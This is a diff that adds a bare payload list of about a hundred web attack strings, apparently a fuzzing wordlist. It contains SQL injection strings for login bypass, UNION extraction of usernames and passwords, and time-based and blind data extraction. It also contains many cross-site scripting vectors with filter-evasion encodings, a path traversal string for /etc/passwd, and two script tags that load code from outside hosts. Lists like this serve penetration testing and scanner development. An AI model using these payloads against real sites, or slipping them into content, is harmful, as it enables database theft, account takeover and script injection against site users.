@@ -1,0 +1,100 @@
+<script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+../etc/passwd
+%27--+
+" onmouseover="alert('xss')
+' OR '1'='1
+' OR '1'='1' --
+' OR 1=1 --
+admin' --
+' OR 'a'='a
+' OR '' = '
+' OR 1=1#
+' OR 1=1/*
+' or 1=1 limit 1; --
+' OR sleep(5)--
+admin' # 
+1' AND 1=1 --
+1' AND 1=2 --
+' AND 1=1 --
+' AND 1=2 --
+' AND sleep(3) --
+' UNION SELECT 1,2,3 --
+' UNION SELECT null, null, null --
+' UNION SELECT username, password FROM users --
+admin' or '1'='1
+" OR "1"="1
+') OR ('1'='1
+admin")-- 
+" OR sleep(3) --
+" AND 1=1 --
+" AND 1=2 --
+admin' AND substring(@@version,1,1)='5
+' OR EXISTS(SELECT * FROM users) --
+' AND EXISTS(SELECT * FROM users WHERE username='admin') --
+' AND ascii(lower(substr((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)))>100 --
+"-prompt(8)-"
+'-prompt(8)-'
+";a=prompt,a()//
+';a=prompt,a()//
+'-eval("window['pro'%2B'mpt'](8)")-'
+"-eval("window['pro'%2B'mpt'](8)")-"
+"onclick=prompt(8)>"@x.y
+"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+<image/src/onerror=prompt(8)>
+<img/src/onerror=prompt(8)>
+<image src/onerror=prompt(8)>
+<img src/onerror=prompt(8)>
+<image src =q onerror=prompt(8)>
+<img src =q onerror=prompt(8)>
+</scrip</script>t><img src =q onerror=prompt(8)>
+<svg onload=alert(1)>
+"><svg onload=alert(1)//
+"onmouseover=alert(1)//
+"autofocus/onfocus=alert(1)//
+'-alert(1)-'
+'-alert(1)//
+\'-alert(1)//
+</script><svg onload=alert(1)>
+<x contenteditable onblur=alert(1)>lose focus! 
+<x onclick=alert(1)>click this! 
+<x oncopy=alert(1)>copy this! 
+<x oncontextmenu=alert(1)>right click this! 
+<x oncut=alert(1)>copy this! 
+<x ondblclick=alert(1)>double click this! 
+<x ondrag=alert(1)>drag this! 
+<x contenteditable onfocus=alert(1)>focus this! 
+<x contenteditable oninput=alert(1)>input here! 
+<x contenteditable onkeydown=alert(1)>press any key! 
+<x contenteditable onkeypress=alert(1)>press any key! 
+<x contenteditable onkeyup=alert(1)>press any key! 
+<x onmousedown=alert(1)>click this! 
+<x onmousemove=alert(1)>hover this! 
+<x onmouseout=alert(1)>hover this! 
+<x onmouseover=alert(1)>hover this! 
+<x onmouseup=alert(1)>click this! 
+<x contenteditable onpaste=alert(1)>paste here!
+<script>alert(1)// 
+<script>alert(1)<!–
+<script src=//brutelogic.com.br/1.js> 
+<script src=//3334957647/1>
+%3Cx onxxx=alert(1) 
+<%78 onxxx=1 
+<x %6Fnxxx=1 
+<x o%6Exxx=1 
+<x on%78xx=1 
+<x onxxx%3D1
+<X onxxx=1 
+<x OnXxx=1 
+<X OnXxx=1 
+<x onxxx=1 onxxx=1
+<x/onxxx=1 
+<x%09onxxx=1 
+<x%0Aonxxx=1 
+<x%0Conxxx=1 
+<x%0Donxxx=1 
+<x%2Fonxxx=1 
+<x 1='1'onxxx=1 
+<x 1="1"onxxx=1
+<x </onxxx=1 
+<x 1=">" onxxx=1
